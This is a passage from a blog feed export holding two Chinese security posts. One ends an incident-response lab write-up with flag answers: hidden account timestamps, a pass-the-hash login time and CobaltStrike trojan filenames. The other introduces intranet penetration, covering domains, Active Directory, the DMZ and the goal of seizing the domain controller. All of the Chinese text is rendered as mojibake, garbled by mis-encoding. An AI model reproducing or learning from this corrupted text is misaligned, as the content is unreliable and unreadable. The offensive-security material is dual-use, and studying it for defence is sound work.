<h4 id="ä»»åŠ¡ä¸ƒ-3"><a href="#ä»»åŠ¡ä¸ƒ-3" class="headerlink" title="ä»»åŠ¡ä¸ƒ"></a>ä»»åŠ¡ä¸ƒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢éšè—è´¦æˆ·åˆ›å»ºæ—¶é—´æ˜¯,å°†éšè—è´¦æˆ·åˆ›å»ºæ—¶é—´æ˜¯ ä½œä¸ºFLAG æäº¤ï¼ˆç­”æ¡ˆæ ¼å¼ï¼š2024/12/3 9:16:23ï¼‰;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±è¿˜æ˜¯ä¸Šé¢çš„å¤åˆ¶ä¸€ä¸‹å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:45:34&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å…«-1"><a href="#ä»»åŠ¡å…«-1" class="headerlink" title="ä»»åŠ¡å…«"></a>ä»»åŠ¡å…«</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢æ·»åŠ éšè—è´¦æˆ·è¿›ç®¡ç†å‘˜ç»„çš„æ—¶é—´,å°†æ·»åŠ éšè—è´¦æˆ·è¿›ç®¡ç†å‘˜ç»„çš„æ—¶é—´ ä½œä¸ºFLAG æäº¤ï¼ˆç­”æ¡ˆæ ¼å¼ï¼š2024/12/3 9:16:23ï¼‰;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/ac04667dc5854f2a7fd295a736d0158e--4c88--image-20240711155817233.png" alt="image-20240711155817233"></p>
<p>ç›´æ¥å°±è¿˜æ˜¯ç»§ç»­å»æ‰¾å°±è¡Œ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/928aac9f7b928689d9832f9a6dd9eeaa--df31--image-20240711155958987.png" alt="image-20240711155958987"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:46:07&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¹-1"><a href="#ä»»åŠ¡ä¹-1" class="headerlink" title="ä»»åŠ¡ä¹"></a>ä»»åŠ¡ä¹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢åœ¨ä»€ä¹ˆæ—¶é—´ä»æ–‡ä»¶ä¸­è¯»å–ä¿ç•™çš„å¯†é’¥,å°†è¯»å–ä¿ç•™çš„å¯†é’¥çš„æ—¶é—´ ä½œä¸ºFLAG æäº¤ï¼ˆç­”æ¡ˆæ ¼å¼ï¼š2024/12/3 9:16:23ï¼‰;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/338a7070d1b9fe8a5825864084fe2270--a52f--image-20240711160439388.png" alt="image-20240711160439388"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:46:58&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å-1"><a href="#ä»»åŠ¡å-1" class="headerlink" title="ä»»åŠ¡å"></a>ä»»åŠ¡å</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢é€šè¿‡éšè—è´¦æˆ·é€šè¿‡(PTH)å“ˆå¸Œä¼ é€’æ”»å‡»ç™»å½•çš„æ—¶é—´æ˜¯,å°†(PTH)å“ˆå¸Œä¼ é€’æ”»å‡»ç™»å½•çš„æ—¶é—´ ä½œä¸ºFLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å“ˆå¸Œä¼ é€’æ”»å‡»æ¥ç™»å½•ï¼Œæˆ‘ä»¬æœç´¢ç™»å½•æˆåŠŸçš„äº‹ä»¶ï¼Œå¹¶æ³¨æ„æ˜¯å¦å«æœ‰NTLM</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/4cc21afdf267514ef02f8843b5f1a89f--94d8--image-20240711160943170.png" alt="image-20240711160943170"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:47:28&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡åä¸€"><a href="#ä»»åŠ¡åä¸€" class="headerlink" title="ä»»åŠ¡åä¸€"></a>ä»»åŠ¡åä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢ä¸Šä¼ çš„ä¸¤ä¸ªCobaltStrikeæœ¨é©¬æ–‡ä»¶å,å°†ä¸Šä¼ çš„ä¸¤ä¸ªCobaltStrikeæœ¨é©¬æ–‡ä»¶å ä½œä¸ºFLAG æäº¤ï¼ˆç­”æ¡ˆæ ¼å¼ï¼š&quot;A.exe,B.exe&quot;ï¼‰;</span><br></pre></td></tr></table></figure>

<p>ç”¨D-Eyesæ‰«æ¶æ„æ–‡ä»¶ï¼Œå‘ç°æ–‡ä»¶Windows Defenderè‡ªåŠ¨éš”ç¦»äº†ï¼Œæ ·æœ¬æå–éœ€è¦ä»éš”ç¦»åŒºæ¢å¤å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;SystemTemp.exe, SysnomT.exe&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title>å†…ç½‘æ¸—é€çŸ¥è¯†ç‚¹æ€»ç»“</title>
    <url>/2024/06/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>æœ€è¿‘æ‰“äº†ä¸å°‘æ˜¥ç§‹äº‘é•œçš„å†…ç½‘æ¸—é€çš„å¾½ç« ï¼Œæ‰€ä»¥æ‰“ç®—å¯¹å†…ç½‘çš„çŸ¥è¯†ç‚¹è¿›è¡Œä¸€ä¸ªæ€»ç»“å­¦ä¹ ã€‚</p>
<span id="more"></span>

<h1 id="ä¸€ã€å†…ç½‘æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ã€å†…ç½‘æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ã€å†…ç½‘æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸€ã€å†…ç½‘æ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>å†…ç½‘ä¹ŸæŒ‡å±€åŸŸç½‘ï¼Œæ˜¯æŒ‡åœ¨æŸä¸ªåŒºåŸŸç”±å¤šå°è®¡ç®—æœºäº’è¿è€Œæˆçš„è®¡ç®—æœºç»„ï¼Œç»„ç½‘èŒƒå›´é€šå¸¸åœ¨æ•°åƒç±³ä»¥å†…ã€‚</p>
<p>åœ¨å±€åŸŸç½‘ä¸­ï¼Œå¯ä»¥å®ç°æ–‡ä»¶ç®¡ç†ã€åº”ç”¨è½¯ä»¶å…±äº«ã€æ‰“å°æœºå…±äº«ã€å·¥ä½œç»„å†…çš„æ—¥ç¨‹å®‰æ’ã€ç”µå­é‚®ä»¶å’Œä¼ çœŸé€šä¿¡æœåŠ¡ç­‰ã€‚</p>
<p>å†…ç½‘æ˜¯å°é—­çš„ï¼Œå¯ä»¥ç”±åŠå…¬å®¤å†…çš„ä¸¤å°è®¡ç®—æœºç»„æˆï¼Œä¹Ÿå¯ä»¥ç”±ä¸€ä¸ªå…¬å¸å†…çš„å¤§é‡è®¡ç®—æœºç»„æˆã€‚</p>
<p>ç®€å•æ¥è¯´ï¼šå†…ç½‘å°±æ˜¯æŸä¸€åŒºåŸŸå†…å°é—­çš„è®¡ç®—æœºç»„ï¼Œç”±å¤§é‡çš„è®¡ç®—æœºç»„æˆã€‚</p>
<p>ä¸€ä¸ªç®€å•çš„ç½‘ç»œæ‹“æ‰‘å›¾ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/686758e25b44ac5052c1d58e832b5595--1e96--image-20240603162935647.png" alt="image-20240603162935647"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/24353d28c62d43e09e3103477a6f5a24--c450--2752372-20220719180949017-1117785613.png" alt="2752372-20220719180949017-1117785613"></p>
<p>å¯ä»¥çœ‹å‡ºå°±æ˜¯å†…ç½‘æ˜¯ç‹¬ç«‹äºå¤–ç½‘çš„ï¼Œå¤–ç½‘æ— æ³•ç›´æ¥å»è®¿é—®å†…ç½‘ä¸­çš„ä¸»æœºï¼Œåªæœ‰é€šè¿‡VPNï¼Œä»£ç†ç­‰æŠ€æœ¯å»é—´æ¥è®¿é—®ã€‚</p>
<p><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a>  Webå®‰å…¨å­¦ä¹ ç¬”è®°</p>
<h1 id="äºŒã€å†…ç½‘æ¸—é€åˆæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#äºŒã€å†…ç½‘æ¸—é€åˆæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="äºŒã€å†…ç½‘æ¸—é€åˆæ˜¯ä»€ä¹ˆï¼Ÿ"></a>äºŒã€å†…ç½‘æ¸—é€åˆæ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>å†…ç½‘æ¸—é€ï¼Œä»å­—é¢ä¸Šç†è§£ä¾¿æ˜¯å¯¹ç›®æ ‡æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘è¿›è¡Œæ¸—é€å¹¶æœ€ç»ˆè·å–åŸŸæ§æƒé™çš„ä¸€ç§æ¸—é€ã€‚å†…ç½‘æ¸—é€çš„å‰ææ˜¯è·å–ä¸€ä¸ªwebshellï¼Œå¯ä»¥æ˜¯ä½æƒé™çš„webshellï¼Œå› ä¸ºå¯ä»¥é€šè¿‡ææƒè·å–é«˜æƒé™</p>
<p>åœ¨è¿›è¡Œå†…ç½‘æ¸—é€ä¹‹å‰éœ€è¦äº†è§£ä¸€ä¸ªæ¦‚å¿µï¼Œ<strong>åŸŸç¯å¢ƒ</strong>ã€‚åœ¨å†…ç½‘ä¸­ï¼Œå¾€å¾€å¯èƒ½å­˜åœ¨å‡ ç™¾ä¸Šåƒå°æœºå™¨ï¼Œä¾‹å¦‚éœ€è¦å¯¹æœºå™¨è¿›è¡Œå‡çº§ã€æ‰“è¡¥ä¸ï¼Œè®¾ç½®æƒé™ç­‰ï¼Œç®¡ç†å‘˜ä¸å¯èƒ½ä¸€å°ä¸€å°åœ°æ›´æ–°ä¿®æ”¹ï¼Œå› æ­¤è¡ç”Ÿå‡ºäº†åŸŸç¯å¢ƒã€‚  ï¼ˆåŸŸæ§DCä¸€èˆ¬éƒ½æ˜¯Windowsç³»ç»Ÿï¼‰ ï¼ˆä½†å¹¶ä¸ç»å¯¹ï¼Œ<a href="https://www.dbs724.com/113421.html">Linux</a>ä¹Ÿèƒ½å¤Ÿæˆä¸ºåŸŸæ§ï¼‰</p>
<p>ç®¡ç†å‘˜ä»¥ä¸€å°ä¸»æœºä½œä¸ºåŸŸæ§åˆ¶å™¨æ–°å»ºä¸€ä¸ªåŸŸï¼Œå°†å…¶ä»–ä¸»æœºåŠ å…¥åŸŸä¸­ï¼Œä»¥åŸŸæ§æ¥æ“ä½œå…¶ä»–ä¸»æœºã€‚å› ä¸ºåŸŸæ§çš„æœ€é«˜æƒé™ï¼Œå¯¼è‡´äº†åŸŸæ§æ‰€åœ¨çš„ä¸»æœºçš„ç®¡ç†å‘˜è´¦æˆ·å¯†ç å¯ä»¥ç™»é™†ä»»æ„ä¸€å°ä¸»æœºï¼Œæ‰€ä»¥å†…ç½‘æ¸—é€çš„æœ€ç»ˆç›®æ ‡ï¼Œå¾€å¾€æ˜¯æ‹¿ä¸‹åŸŸæ§çš„æƒé™</p>
<h1 id="ä¸‰ã€å†…ç½‘å¿…é¡»çŸ¥è¯†â€”-å†…ç½‘ç©¿é€"><a href="#ä¸‰ã€å†…ç½‘å¿…é¡»çŸ¥è¯†â€”-å†…ç½‘ç©¿é€" class="headerlink" title="ä¸‰ã€å†…ç½‘å¿…é¡»çŸ¥è¯†â€”-å†…ç½‘ç©¿é€"></a>ä¸‰ã€å†…ç½‘å¿…é¡»çŸ¥è¯†â€”-å†…ç½‘ç©¿é€</h1><p>åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ‹¿ä¸‹äº†ä¸€å°æœåŠ¡å™¨çš„æƒé™ï¼Œå¹¶ä¸”é€šè¿‡<code>netstat -ano</code>å‘ç°å¼€å¯äº†3389ç«¯å£ï¼Œæƒ³è¦è¿œç¨‹æ¡Œé¢è¿æ¥çš„æ—¶å€™å‘ç°æ— æ³•è¿æ¥ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬è·å–çš„æœåŠ¡å™¨æ‰€å¤„çš„ç¯å¢ƒä¸ºå†…ç½‘ï¼Œè€Œå†…ç½‘ä¸»æœºçš„3389ç«¯å£ï¼Œæ˜¯å…¬ç½‘IPé€šè¿‡ç«¯å£æ˜ å°„çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¿æ¥çš„å¤–ç½‘IPåœ°å€çš„3389ç«¯å£ï¼Œæ˜ å°„åˆ°å†…ç½‘ä¸­ï¼Œä¸ä¸€å®šæ˜¯é‚£å°æœåŠ¡å™¨çš„3389ç«¯å£ã€‚</p>
<p><strong>è§£å†³è¿™ç§é—®é¢˜çš„æ–¹æ³•æœ‰ä¿©ç§ï¼š</strong></p>
<ul>
<li>è®©ç›®æ ‡æœºå™¨å»è¿æ¥å¤–ç½‘ä¸»æœºï¼ˆå¿…é¡»æœ‰ä¸€å°å…¬ç½‘æœåŠ¡å™¨ï¼Œå†…ç½‘ä¸»æœºèƒ½å¤Ÿè®¿é—®äº’è”ç½‘ï¼‰</li>
<li>åœ¨ç›®å‰æœºå™¨ä¸Šè®¾ç½®ä¸€ä¸ªä¿¡å·ç«™ï¼ˆæ”¾ä¸€ä¸ªwebæ–‡ä»¶åœ¨ç›®æ ‡æœºå™¨ä¸Šï¼Œæ‰€æœ‰æµé‡éƒ½è¦ç»è¿‡è¿™ä¸ªæ–‡ä»¶é€šä¿¡ï¼‰ ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹å°±æ˜¯sockséš§é“çš„æ­å»ºï¼‰</li>
</ul>
<p>åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå†…ç½‘ä¸»æœºä¸èƒ½è®¿é—®äº’è”ç½‘æ˜¯å¾ˆå¸¸è§çš„ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨çš„å°±æ˜¯stowawayæ­å»ºç½‘ç»œä»£ç† â€”â€”â€”â€”â€”â€”â€”<a href="https://blog.csdn.net/qq_44159028/article/details/129681017">https://blog.csdn.net/qq_44159028/article/details/129681017</a></p>
<h1 id="å››ã€å†…ç½‘ç»“æ„"><a href="#å››ã€å†…ç½‘ç»“æ„" class="headerlink" title="å››ã€å†…ç½‘ç»“æ„"></a>å››ã€å†…ç½‘ç»“æ„</h1><p><a href="https://www.freebuf.com/articles/network/306068.html">https://www.freebuf.com/articles/network/306068.html</a></p>
<h2 id="1ã€å·¥ä½œç»„Work-Group"><a href="#1ã€å·¥ä½œç»„Work-Group" class="headerlink" title="1ã€å·¥ä½œç»„Work Group:"></a>1ã€å·¥ä½œç»„Work Group:</h2><p>æ˜¯æœ€å¸¸è§æœ€ç®€å•æœ€æ™®é€šçš„èµ„æºç®¡ç†æ¨¡å¼ï¼Œå°±æ˜¯å°†ä¸åŒçš„ç”µè„‘æŒ‰åŠŸèƒ½åˆ†åˆ«åˆ—å…¥ä¸åŒçš„ç»„ä¸­ï¼Œä»¥æ–¹ä¾¿ç®¡ç†ã€‚</p>
<h2 id="2ã€åŸŸ"><a href="#2ã€åŸŸ" class="headerlink" title="2ã€åŸŸ"></a>2ã€åŸŸ</h2><p>åŸŸæ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼ŒåŸŸé€šè¿‡å®‰å…¨è¾¹ç•Œæ¥éš”ç¦»æœ¬åŸŸå’Œå¤–éƒ¨èµ„æºã€‚</p>
<p>åŸŸåˆå¯ä»¥å†è¿›ä¸€æ­¥çš„åˆ†ç±»ï¼š</p>
<ul>
<li>å•åŸŸ                  å°±ä¸¤å°ä¸»æœºï¼Œä¸€å°DCä¸€å°å¤‡ä»½DC</li>
<li>çˆ¶åŸŸï¼Œå­åŸŸ       åˆ’åˆ†å¤šä¸ªåŸŸï¼Œç¬¬ä¸€ä¸ªåŸŸä¸ºçˆ¶åŸŸï¼Œå…¶ä»–ä¸ºå­åŸŸ</li>
<li>åŸŸæ ‘ï¼ˆtreeï¼‰     åŸŸæ ‘æ˜¯å¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚</li>
<li>åŸŸæ—ï¼ˆforestï¼‰  åŸŸæ—æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ²¡æœ‰å½¢æˆè¿ç»­åå­—ç©ºé—´çš„åŸŸæ ‘ç»„æˆï¼Œå®ƒå’ŒåŸŸæ ‘æœ€å¤§çš„åŒºåˆ«å°±æ˜¯åŸŸæ—ä¹‹é—´æ²¡æœ‰å½¢æˆè¿ç»­çš„åå­—ç©ºé—´ï¼Œè€ŒåŸŸæ ‘åˆ™æ˜¯ç”±ä¸€äº›å…·æœ‰è¿ç»­åå­—ç©ºé—´çš„åŸŸç»„æˆã€‚</li>
<li>DNSåŸŸåæœåŠ¡å™¨   DNSæœåŠ¡å™¨ï¼Œè®¡ç®—æœºä½¿ç”¨DNSæ¥å®šä½DCã€æœåŠ¡å™¨å’Œå…¶ä»–è®¡ç®—æœºçš„ï¼Œæ‰€ä»¥åŸŸçš„åå­—å°±æ˜¯DNSåŸŸçš„åå­—ã€‚</li>
</ul>
<h2 id="3ã€æ´»åŠ¨ç›®å½•-AD"><a href="#3ã€æ´»åŠ¨ç›®å½•-AD" class="headerlink" title="3ã€æ´»åŠ¨ç›®å½•(AD)"></a>3ã€æ´»åŠ¨ç›®å½•(AD)</h2><p>ç®€å†™ä¸º<code>AD</code>ï¼Œå®ƒæ˜¯ Windows Server ä¸­è´Ÿè´£æ¶æ„ä¸­å¤§å‹ç½‘ç»œç¯å¢ƒçš„é›†ä¸­å¼ç›®å½•ç®¡ç†æœåŠ¡</p>
<p><strong>æ´»åŠ¨ç›®å½•çš„åŠŸèƒ½ï¼š</strong></p>
<ul>
<li>è´¦æˆ·é›†ä¸­ç®¡ç†</li>
<li>è½¯ä»¶é›†ä¸­ç®¡ç†</li>
<li>ç¯å¢ƒé›†ä¸­ç®¡ç†</li>
<li>å¢å¼ºå®‰å…¨æ€§</li>
<li>æ›´å¯é ã€æ›´çŸ­çš„å®•æœºæ—¶é—´</li>
</ul>
<p><strong>æ´»åŠ¨ç›®å½•ä¸åŸŸæ§åˆ¶å™¨çš„åŒºåˆ«</strong></p>
<p>ç”±åŸŸç½‘ç»œä¸­çš„ä¼—å¤šå¯¹è±¡ç»„æˆçš„å±‚æ¬¡ç»“æ„çš„æ•°æ®åº“è¢«ç§°ä¸ºæ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼ˆADåº“ï¼‰ã€‚è¦å®ç°åŸŸç¯å¢ƒå…¶å®å°±æ˜¯è¦å®‰è£…ADï¼Œå¦‚æœå†…ç½‘ä¸­æŸå°æœºå™¨å®‰è£…äº†ADï¼Œé‚£ä¹ˆä»–å°±æ˜¯DCã€‚ä¹Ÿå°±å®ç°äº†åªéœ€è¦åœ¨æ´»åŠ¨ç›®å½•ä¸­å¯¹æŸä¸ªè´¦å·ä¿®æ”¹ä¸€æ¬¡å¯†ç ï¼Œåœ¨æ•´ä¸ªåŸŸä¸­ä»»æ„ä¸€å°æœºå™¨ä¸Šéƒ½å¯ä½¿ç”¨è¯¥è´¦å·ç™»å½•ã€‚<br>æ–¹ä¾¿äº†DCå¯¹åŸŸå†…å…¶ä»–æœºå™¨çš„ç»Ÿä¸€ç®¡ç†</p>
<h2 id="4ã€å®‰å…¨åŸŸ"><a href="#4ã€å®‰å…¨åŸŸ" class="headerlink" title="4ã€å®‰å…¨åŸŸ"></a>4ã€å®‰å…¨åŸŸ</h2><p><strong>å®‰å…¨åŸŸçš„åˆ’åˆ†ç›®çš„ï¼š</strong></p>
<p>å°†ä¸€ç»„å®‰å…¨ç­‰çº§ç›¸åŒçš„è®¡ç®—æœºåˆ’å¦‚åŒä¸€ç½‘æ®µã€‚</p>
<p>è¿™ä¸ªç½‘æ®µå†…çš„è®¡ç®—æœºæ‹¥æœ‰ç›¸åŒçš„ç½‘ç»œè¾¹ç•Œï¼Œå¹¶åœ¨ç½‘ç»œè¾¹ç•Œä¸Šé€šè¿‡éƒ¨ç½²é˜²ç«å¢™æ¥å®ç°å¯¹å…¶ä»–å®‰å…¨åŸŸçš„ç½‘ç»œæ§åˆ¶ç­–ç•¥ï¼Œä»è€Œå…è®¸å“ªäº›IPåœ°å€è®¿é—®åŸŸï¼Œå…è®¸æ­¤åŸŸè®¿é—®å“ªäº›IPåœ°å€å’Œç½‘æ®µè¿›è¡Œè®¾ç½®ã€‚</p>
<p>è¿™äº›æªæ–½å°†ä½¿å¾—ç½‘ç»œé£é™©æœ€å°åŒ–ï¼Œå½“æ”»å‡»å‘ç”Ÿæ—¶ï¼Œå¯ä»¥å°½å¯èƒ½åœ°å°†å¨èƒéš”ç¦»ä»è€Œé™ä½å¯¹åŸŸå†…è®¡ç®—æœºçš„å½±å“</p>
<p><strong>DMZ</strong></p>
<p>DMZ<code>demilitarized zone</code>ï¼Œä¸­æ–‡åä¸ºâ€œéš”ç¦»åŒºâ€ï¼Œæˆ–ç§°â€œéå†›äº‹åŒ–åŒºâ€ã€‚å®ƒæ˜¯ä¸ºäº†è§£å†³å®‰è£…é˜²ç«å¢™åå¤–éƒ¨ç½‘ç»œçš„è®¿é—®ç”¨æˆ·ä¸èƒ½è®¿é—®å†…éƒ¨ç½‘ç»œæœåŠ¡å™¨çš„é—®é¢˜ï¼Œä»è€Œè®¾ç«‹çš„ä¸€ä¸ªéå®‰å…¨ç³»ç»Ÿä¸å®‰å…¨ç³»ç»Ÿä¹‹é—´çš„ç¼“å†²åŒºã€‚</p>
<p><strong>ç®€ç­”æ¥è¯´ï¼šDMZå°±æ˜¯å°†å†…ç½‘ä¸å¤–ç½‘è¿›è¡Œéš”ç¦»ï¼Œå­˜æ”¾ä¸€äº›å¿…é¡»å…¬å¼€çš„æœåŠ¡å™¨è®¾æ–½ï¼Œç”¨æ¥å¯¹å¤–æä¾›æœåŠ¡ã€‚</strong></p>
<p><strong>åŠå…¬åŒº</strong></p>
<p>å…¬å¸å‘˜å·¥æ—¥å¸¸çš„å·¥ä½œåŒºï¼Œä¸€èˆ¬ä¼šå®‰è£…é˜²ç—…æ¯’è½¯ä»¶ã€ä¸»æœºå…¥ä¾µæ£€æµ‹äº§å“ç­‰ã€‚åŠå…¬åŒºèˆ¬èƒ½å¤Ÿè®¿é—®DMZã€‚å¦‚æœè¿ç»´äººå‘˜ä¹Ÿåœ¨åŠå…¬åŒºï¼Œé‚£ä¹ˆéƒ¨åˆ†ä¸»æœºä¹Ÿèƒ½è®¿é—®æ ¸å¿ƒæ•°æ®åŒºï¼ˆå¾ˆå¤šå¤§ä¼ä¸šè¿˜ä¼šä½¿ç”¨å ¡å’æœºæ¥ç»Ÿä¸€ç®¡ç†ç”¨æˆ·çš„ç™»å½•è¡Œä¸ºï¼‰ã€‚</p>
<p>æ”»å‡»è€…å¦‚æœæƒ³è¿›å…¥å†…ç½‘ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨é±¼å‰æ”»å‡»ã€æ°´å‘æ”»å‡»ï¼Œå½“ç„¶è¿˜æœ‰ç¤¾ä¼šå·¥ç¨‹å­¦æ‰‹æ®µã€‚åŠå…¬åŒºäººå‘˜å¤šè€Œæ‚ï¼Œå˜åŠ¨ä¹Ÿå¾ˆé¢‘ç¹ï¼Œåœ¨å®‰å…¨ç®¡ç†ä¸Šå¯èƒ½å­˜åœ¨è¯¸å¤šæ¼æ´ï¼Œæ˜¯æ”»å‡»è€…è¿›å…¥å†…ç½‘çš„é‡è¦é€”å¾„ä¹‹ä¸€ã€‚</p>
<p><strong>æ ¸å¿ƒåŒº</strong></p>
<p>å­˜å‚¨ä¼ä¸šæœ€é‡è¦çš„æ•°æ®ã€æ–‡æ¡£ç­‰ä¿¡æ¯èµ„äº§ï¼Œé€šè¿‡æ—¥å¿—è®°å½•ã€å®‰å…¨å®¡è®¡ç­‰å®‰å…¨æªæ–½è¿›è¡Œä¸¥å¯†çš„ä¿æŠ¤ï¼Œå¾€å¾€åªæœ‰å¾ˆå°‘çš„ä¸»æœºèƒ½å¤Ÿè®¿é—®ã€‚ä»å¤–éƒ¨æ˜¯å¾ˆéš¾ç›´æ¥è®¿é—®æ ¸å¿ƒåŒºçš„ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œèƒ½å¤Ÿç›´æ¥è®¿é—®æ ¸å¿ƒåŒºçš„åªæœ‰è¿ç»´äººå‘˜æˆ–è€…ITéƒ¨é—¨çš„ä¸»ç®¡ï¼Œæ‰€ä»¥ï¼Œæ”»å‡»è€…ä¼šé‡ç‚¹å…³æ³¨è¿™äº›ç”¨æˆ·çš„ä¿¡æ¯ï¼ˆæ”»å‡»è€…åœ¨å†…ç½‘ä¸­è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ”»å‡»æ—¶ï¼Œä¼šä¼˜å…ˆæŸ¥æ‰¾è¿™äº›ä¸»æœºï¼‰</p>
<h1 id="äº”ã€åŸŸæƒé™"><a href="#äº”ã€åŸŸæƒé™" class="headerlink" title="äº”ã€åŸŸæƒé™"></a>äº”ã€åŸŸæƒé™</h1><ol>
<li><p>åŸŸæœ¬åœ°ç»„</p>
<p>å¤šåŸŸç”¨æˆ·è®¿é—®å•åŸŸèµ„æºï¼ˆè®¿é—®åŒä¸€åŸŸï¼‰ï¼Œä¸èƒ½åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ï¼Œåªèƒ½åœ¨å…¶æ‰€åœ¨åŸŸå†…æŒ‡æ´¾æƒé™</p>
</li>
<li><p>å…¨å±€ç»„</p>
<p>å•åŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æºï¼ˆå¿…é¡»æ˜¯åŒä¸€åŸŸé‡Œé¢çš„ç”¨æˆ·ï¼‰ï¼Œèƒ½å¤ŸåµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ï¼Œå¯åœ¨åŸŸæ—ä¸­çš„ä»»ä½•åŸŸæŒ‡æ´¾æƒé™</p>
</li>
<li><p>é€šç”¨ç»„</p>
<p>å¤šåŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æºï¼Œæˆå‘˜ä¿¡æ¯ä¸ä¿å­˜åœ¨åŸŸæ§åˆ¶å™¨ä¸­ï¼Œè€Œæ˜¯ä¿å­˜åœ¨å…¨å±€ç¼–å½•ï¼ˆGCï¼‰ä¸­ï¼Œä»»ä½•å˜åŒ–éƒ½ä¼šå¯¼è‡´å…¨æ—å¤åˆ¶</p>
</li>
</ol>
<h3 id="A-G-DL-Pç­–ç•¥"><a href="#A-G-DL-Pç­–ç•¥" class="headerlink" title="A-G-DL-Pç­–ç•¥"></a>A-G-DL-Pç­–ç•¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Aï¼šAccountï¼Œç”¨æˆ·è´¦å·</span><br><span class="line"></span><br><span class="line">Gï¼šGlobal Groupï¼Œå…¨å±€ç»„</span><br><span class="line"></span><br><span class="line">Uï¼šUniversal Groupï¼Œé€šç”¨ç»„</span><br><span class="line"></span><br><span class="line">DLï¼šDomain Local Groupï¼ŒåŸŸæœ¬åœ°ç»„</span><br><span class="line"></span><br><span class="line">Pï¼šPermissionï¼Œè®¸å¯ï¼Œèµ„æºæƒé™</span><br><span class="line">å…ˆå°†ç”¨æˆ·è´¦å·æ·»åŠ è‡³å…¨å±€ç»„ä¸­ï¼Œå†å°†å…¨å±€ç»„æ·»åŠ è‡³åŸŸæœ¬åœ°ç»„ä¸­ï¼Œç„¶åä¸ºåŸŸæœ¬åœ°ç»„åˆ†é…èµ„æºæƒé™</span><br></pre></td></tr></table></figure>

<h3 id="åŸŸå†…æƒé™è§£è¯»"><a href="#åŸŸå†…æƒé™è§£è¯»" class="headerlink" title="åŸŸå†…æƒé™è§£è¯»"></a>åŸŸå†…æƒé™è§£è¯»</h3><ul>
<li>åŸŸæœ¬åœ°ç»„ï¼šæ¥è‡ªå…¨æ—ä½œç”¨äºæœ¬åŸŸ</li>
